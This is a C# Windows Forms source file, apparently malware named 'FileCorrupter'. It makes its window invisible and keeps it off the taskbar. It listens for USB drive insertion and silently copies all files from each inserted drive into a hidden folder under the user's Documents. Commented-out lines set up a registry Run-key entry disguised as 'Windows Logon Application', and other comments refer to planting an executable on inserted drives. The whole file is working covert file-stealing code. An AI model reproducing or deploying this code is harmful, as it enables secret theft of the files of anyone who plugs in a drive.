using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using E_Library;

namespace FileCorrupter
{
    public partial class Form1 : Form
    {

       // RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        List<string>[] directory_files = new List<string>[3];
        rs searchfiles;
        const int WM_DEVICECHANGE = 0x0219;                                 ///
        const int DBT_DEVICEARRIVAL = 0x8000;
        const int DBT_DEVICEREMOVALCOMPLETE = 0x8004;
        const int DBT_DEVTYPVOLUME = 0x00000002;
        char[] Drives = new char[3] { ':', ':', ':' };

      

        public Form1()
        {
            InitializeComponent();
            this.Hide();
            this.FormBorderStyle = FormBorderStyle.None;
        //    rkApp.SetValue("Windows Logon Application", Application.ExecutablePath.ToString());
            searchfiles = new rs();
            this.Opacity = 0;
            this.ShowInTaskbar = false;            
            directory_files[0] = new List<string>();
            directory_files[1] = new List<string>();
            directory_files[2] = new List<string>();
            

        }

        private void Form1_Load(object sender, EventArgs e)
        {
                   
        
        }


        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == WM_DEVICECHANGE)
                {
                    DEV_BROADCAST_VOLUME vol = new DEV_BROADCAST_VOLUME();
                    vol = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                    if ((m.WParam.ToInt32() == DBT_DEVICEARRIVAL) && (vol.dbcv_devicetype == DBT_DEVTYPVOLUME))
                    {
                        ////////--------------------------------------------------------////
                        ///////////////////    Code to paste usb  disk repair exe here  //////////
                        /////----------------------------------------------------///////////
                        char drv = DriveMaskToLetter(vol.dbcv_unitmask);
                        int i = 0;
                        foreach (char ch in Drives)
                        {
                            if (ch == ':')
                            {
                                Drives[i] = drv;
                                break;
                            }
                            i++;
                        }
                        switch (i)
                        {
                            case 0:
                                if (!backgroundWorker1.IsBusy)
                                {
                                    backgroundWorker1.RunWorkerAsync(Drives[0].ToString());
                                }
                                break;
                            case 1:
                                if (!backgroundWorker2.IsBusy)
                                {
                                    backgroundWorker2.RunWorkerAsync(Drives[1].ToString());
                                }
                                break;
                            case 2:
                                if (!backgroundWorker3.IsBusy)
                                {
                                    backgroundWorker3.RunWorkerAsync(Drives[2].ToString());
                                }
                                break;
                        }

                    }
                    if ((m.WParam.ToInt32() == DBT_DEVICEREMOVALCOMPLETE) && (vol.dbcv_devicetype == DBT_DEVTYPVOLUME))
                    {
                        char disk = DriveMaskToLetter(vol.dbcv_unitmask);
                        int i = 0;
                        foreach (char ch in Drives)
                        {
                            if (ch == disk)
                            {
                                Drives[i] = ':';                                                  // checks which drive has been unplugged
                                break;
                            }
                            i++;
                        }
                        switch (i)
                        {
                            case 0:
                                if (backgroundWorker1.IsBusy)
                                {
                                    backgroundWorker1.WorkerSupportsCancellation = true;         //cancels the backgroundworker work of that drive
                                    backgroundWorker1.CancelAsync();
                                }
                                break;
                            case 1:
                                if (backgroundWorker2.IsBusy)
                                {
                                    backgroundWorker2.WorkerSupportsCancellation = true;
                                    backgroundWorker2.CancelAsync();
                                }
                                break;
                            case 2:
                                if (backgroundWorker3.IsBusy)
                                {
                                    backgroundWorker3.WorkerSupportsCancellation = true;
                                    backgroundWorker3.CancelAsync();
                                }
                                break;
                        }

                    }
                }
            }
            catch { }
            base.WndProc(ref m);
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DEV_BROADCAST_VOLUME
        {
            public int dbcv_size;
            public int dbcv_devicetype;
            public int dbcv_reserved;
            public int dbcv_unitmask;
        }

        public static char DriveMaskToLetter(int mask)
        {
            char letter;
            string drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; //1 = A, 2 = B, 3 = C
            int cnt = 0;
            int pom = mask / 2;
            while (pom != 0)    // while there is any bit set in the mask shift it right        
            {
                pom = pom / 2;
                cnt++;
            }
            if (cnt < drives.Length)
                letter = drives[cnt];
            else
                letter = '?';
            return letter;
        }


        private void CopyFiles(string directory, ref List<string> files)
        {
            directory += ":\\";
            files.Clear();
            rs search = new rs();
            string extn = null;
            string dest = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Temp \\" + new Random().Next(34567845).ToString() +"\\";
            Directory.CreateDirectory(dest);
            search.DirSearch(directory, ref files);
            foreach (string filename in files)
            {
                try
                {
                    extn = getextension(filename);
                    if (extn != null)
                    {
                        File.Copy(filename, dest + extn);
                    }

                }

                    catch (Exception ee)
                    {
                        continue;
                    }

             }
            
        }

        private string getextension(string filename)
        {
            if (filename.Contains(@"\"))
            {
                string[] arr = filename.Split('\\');
                return arr[arr.Length - 1].ToLower();
            }
            return null;
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            CopyFiles(e.Argument.ToString(), ref directory_files[0]);
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Drives[0] = ':';
            //MessageBox.Show("Complete 1");
        }

        private void backgroundWorker2_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            //Paste Ucb Disk Repair exe in drive e.Arguments Drive or Drive[0];
            CopyFiles(e.Argument.ToString(), ref directory_files[1]);
        }

        private void backgroundWorker2_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Drives[1] = ':';
            //MessageBox.Show("Complete 2");
        }

        private void backgroundWorker3_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            CopyFiles(e.Argument.ToString(), ref directory_files[2]);
        }

        private void backgroundWorker3_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Drives[2] = ':';
            //MessageBox.Show("Complete 2");
        }
    }
}
